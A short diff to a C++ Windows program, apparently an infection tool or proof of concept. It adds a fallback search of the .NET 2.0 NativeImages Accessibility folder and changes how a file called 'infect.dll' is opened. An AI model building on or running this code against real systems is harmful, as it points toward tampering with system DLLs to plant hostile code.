@@ -141,9 +141,17 @@ int main()
 	CoTaskMemFree(systemPath);
 
 	WIN32_FIND_DATAW findData;
-	const auto findHandle = FindFirstFileW(fullPath.c_str(), &findData);
+	HANDLE findHandle;
+	tryagain:
+		findHandle = FindFirstFileW(fullPath.c_str(), &findData);
 	if (findHandle == INVALID_HANDLE_VALUE)
 	{
+		if (fullPath.find(L"\\assembly\\NativeImages_v4.0.30319_64\\Accessibility\\*.*") != std::string::npos)
+		{
+			fullPath = fullPath.substr(0, fullPath.find(L"\\assembly\\NativeImages_v4.0.30319_64\\Accessibility\\*.*"));
+			fullPath += L"\\assembly\\NativeImages_v2.0.50727_64\\Accessibility\\*.*";
+			goto tryagain;
+		}
 		std::cout << "FindFirstFileW() failed. Last error: " << GetLastError() << std::endl;
 		return EXIT_FAILURE;
 	}
@@ -185,7 +193,8 @@ int main()
 		return EXIT_FAILURE;
 	}
 
-	const auto fileHandle = CreateFile2(L"infect.dll", FILE_READ_ACCESS | FILE_WRITE_ACCESS, FILE_SHARE_READ, OPEN_EXISTING, nullptr);
+	const auto fileHandle = CreateFileW(L"infect.dll", FILE_READ_ACCESS | FILE_WRITE_ACCESS, 0, nullptr, OPEN_EXISTING,
+	                                    FILE_ATTRIBUTE_NORMAL, nullptr);
 	if (fileHandle == INVALID_HANDLE_VALUE)
 	{
 		std::cout << "Failed to open 'infect.dll'. Error: " << GetLastError() << std::endl;
